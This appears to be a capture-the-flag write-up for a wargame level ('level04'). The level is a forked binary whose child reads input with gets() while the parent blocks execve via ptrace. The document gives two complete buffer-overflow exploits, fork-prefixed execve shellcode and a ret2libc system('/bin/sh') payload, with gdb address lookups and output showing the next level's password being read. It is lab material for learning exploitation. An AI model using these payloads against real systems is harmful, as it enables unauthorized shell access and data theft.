# level04
## Program behaviour

1. Call `fork`
2. If child, run a vunerable `gets`
3. If father, `kill` child if attempting to `syscall execve`

## Vulnerability

The son allows uses gets, which is vunerable to buffer-overflow attacks.
The father only prevents `execve` from his direct son.

## Exploitation

Both methods use son's `gets` for a buffer-overflow and `fork` to bypass father's `ptrace`.

### Method 1: prepend `fork` to shellcode

1. Assemble the following `asm`
    - result is `"\x6a\x02\x58\xcd\x80"`
```asm
push 0x2 ; syscall code for fork
pop $eax ; place in register $eax
int 0x80 ; syscall
```

2. Run the exploit with `"\x6a\x02\x58\xcd\x80"` + shellcode as payload
```sh
level04@OverRide:~$ (python -c 'print "\x90" * 106 + "\x6a\x02\x58\xcd\x80" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x80\xd6\xff\xff"'; cat) | ~/level04
Give me some shellcode, k
no exec() for you
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

### Method 2: Ret to libc

1. Search for the right addresses
```gdb
(gdb) print system
$7 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find 0xf7e6aed0, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

2. Run the exploit with `system("/bin/sh")` as payload
```sh
level04@OverRide:~$ (python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "DUDE" + "\xec\x97\xf8\xf7"'; cat) | ~/level04             
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```